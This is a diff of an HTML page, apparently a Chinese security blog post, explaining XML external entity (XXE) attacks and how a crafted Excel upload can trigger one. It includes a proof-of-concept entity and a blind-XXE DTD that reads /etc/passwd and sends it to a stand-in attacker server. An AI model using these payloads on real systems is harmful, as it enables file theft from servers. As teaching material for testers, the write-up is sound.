@@ -135,14 +135,14 @@
 <p><a target="_blank" rel="noopener" href="https://image.3001.net/2017/02/21cd690cb4746d7146c5ef9f951d5746.jpg"><img src="https://image.3001.net/2017/02/21cd690cb4746d7146c5ef9f951d5746.jpg" alt="Image"></a></p>
 <p>有些XML文档包含system标识符定义的“实体”，这些XML文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。</p>
 <p><a target="_blank" rel="noopener" href="https://image.3001.net/2017/02/b420129eeae40a064355b2e8329d7393.jpg"><img src="https://image.3001.net/2017/02/b420129eeae40a064355b2e8329d7393.jpg" alt="Image"></a></p>
-<p>在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取。因此，XML实体被使用的次数越多，越有帮助。</p>
-<h4 id="0×02-什么是XML外部实体攻击？"><a href="#0×02-什么是XML外部实体攻击？" class="headerlink" title="0×02. 什么是XML外部实体攻击？"></a>0×02. 什么是XML外部实体攻击？</h4><p>有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。比如，下面的代码将获取系统上folder/file的内容并呈献给用户。</p>
+<p>在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file:&#x2F;&#x2F;etc&#x2F;passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file:&#x2F;&#x2F;etc&#x2F;passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取。因此，XML实体被使用的次数越多，越有帮助。</p>
+<h4 id="0×02-什么是XML外部实体攻击？"><a href="#0×02-什么是XML外部实体攻击？" class="headerlink" title="0×02. 什么是XML外部实体攻击？"></a>0×02. 什么是XML外部实体攻击？</h4><p>有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。比如，下面的代码将获取系统上folder&#x2F;file的内容并呈献给用户。</p>
 <p><a target="_blank" rel="noopener" href="https://image.3001.net/2017/02/f8743d6009c3adc3b15c06970df03b80.jpg"><img src="https://image.3001.net/2017/02/f8743d6009c3adc3b15c06970df03b80.jpg" alt="Image"></a></p>
 <h4 id="0×03-怎么甄别一个XML实体攻击漏洞？"><a href="#0×03-怎么甄别一个XML实体攻击漏洞？" class="headerlink" title="0×03. 怎么甄别一个XML实体攻击漏洞？"></a>0×03. 怎么甄别一个XML实体攻击漏洞？</h4><p>最直接的回答就是： 甄别那些接受XML作为输入内容的端点。 但是有时候，这些端点可能并不是那么明显(比如，一些仅使用JSON去访问服务的客户端)。在这种情况下，渗透测试人员就必须尝试不同的测试方式，比如修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。</p>
-<h3 id="如何利用EXCEL文档来造成XXE漏洞"><a href="#如何利用EXCEL文档来造成XXE漏洞" class="headerlink" title="如何利用EXCEL文档来造成XXE漏洞"></a>如何利用EXCEL文档来造成XXE漏洞</h3><p>根据原文档介绍，是对excel文件进行解压缩，来替换其中的[Content-Types].xml或者xl/workbook.xml文件，来造成XXE漏洞。</p>
-<p>但根据利用情况的不同，还有可以替换的文件: _rels/.rels 和 xl/worksheets/sheet1.xml等文件。</p>
+<h3 id="如何利用EXCEL文档来造成XXE漏洞"><a href="#如何利用EXCEL文档来造成XXE漏洞" class="headerlink" title="如何利用EXCEL文档来造成XXE漏洞"></a>如何利用EXCEL文档来造成XXE漏洞</h3><p>根据原文档介绍，是对excel文件进行解压缩，来替换其中的[Content-Types].xml或者xl&#x2F;workbook.xml文件，来造成XXE漏洞。</p>
+<p>但根据利用情况的不同，还有可以替换的文件: _rels&#x2F;.rels 和 xl&#x2F;worksheets&#x2F;sheet1.xml等文件。</p>
 <p>因此我们自己的系统在文件上传处，也存在一块，类似的XXE利用。</p>
-<p><img src="%5C2019%5C01%5C%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%5C2233.png" alt="2233"></p>
+<p><img src="/2019/01/%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/%5C2019%5C01%5C%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%5C2233.png" alt="2233"></p>
 <p>例如此处文件上传处，上传EXCEL文件。</p>
 <p>在文件中的[Content-Types].xml中写入测试POC：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;
@@ -150,7 +150,7 @@
 &lt;name&gt;&amp;GVI;&lt;&#x2F;name&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>于是便可以在我们自己的VPS上监听到来自服务器的请求了。</p>
-<p><img src="%5C2019%5C01%5C%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%5C44.png" alt="44"></p>
+<p><img src="/2019/01/%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB/%5C2019%5C01%5C%E5%88%A9%E7%94%A8EXCEL%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8CXXE%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%5C44.png" alt="44"></p>
 <p>由于是Blind XXE，所以我们利用在我们自己的VPS上存入如下文件：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
 &lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &#39;http:&#x2F;&#x2F;ATTACKESERVER.com&#x2F;?%file;&#39;&gt;&quot;&gt;
